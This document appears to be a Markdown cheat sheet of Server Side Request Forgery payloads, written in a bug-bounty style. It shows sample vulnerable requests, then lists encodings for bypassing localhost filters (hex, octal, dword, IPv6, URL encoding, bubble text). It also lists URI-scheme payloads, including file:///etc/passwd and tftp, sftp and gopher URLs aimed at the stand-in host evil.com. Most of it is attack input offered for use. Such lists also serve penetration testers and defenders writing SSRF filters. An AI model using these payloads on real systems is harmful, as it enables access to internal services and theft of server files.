# Server Side Request Forgery (SSRF)

## Introduction
Server Side Request Forgery is a web application vulnerability that allows attackers to make outgoing requests originating from the vulnerable server

## Where to find
Usually it can be found in the request that contain request to another url, for example like this
```
POST /api/check/products HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Origin: https://example.com
Referer: https://example.com

urlApi=http://192.168.1.1%2fapi%2f&id=1
```

or

```
GET /image?url=http://192.168.1.1/
Host: example.com
```

## How to exploit
1. Basic payload
```
http://127.0.0.1:1337
http://localhost:1337
```

2. Hex encoding
```
http://127.0.0.1 -> http://0x7f.0x0.0x0.0x1
```

3. Octal encoding
```
http://127.0.0.1 -> http://0177.0.0.01
```

4. Dword encoding
```
http://127.0.0.1 -> http://2130706433
```

5. Mixed encoding
```
http://127.0.0.1 -> http://0177.0.0.0x1
```

6. Using URL encoding
```
http://localhost -> http://%6c%6f%63%61%6c%68%6f%73%74
```

7. Using IPv6
```
http://0000::1:1337/
http://[::]:1337/
```

8. Using bubble text
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ

Use this https://capitalizemytitle.com/bubble-text-generator/
```

## How to exploit (URI Scheme)
1. File scheme
```
file:///etc/passwd
```

2. Dict scheme
```
dict://127.0.0.1:1337/
```

3. FTP scheme
```
ftp://127.0.0.1/
```

4. TFTP scheme
```
tftp://evil.com:1337/test
```

5. SFTP scheme
```
sftp://evil.com:1337/test
```

6. LDAP scheme
```
ldap://127.0.0.1:1337/
```

7. Gopher scheme
```
gopher://evil.com/_Test%0ASSRF
```
## References
* [Vickie Li](https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b)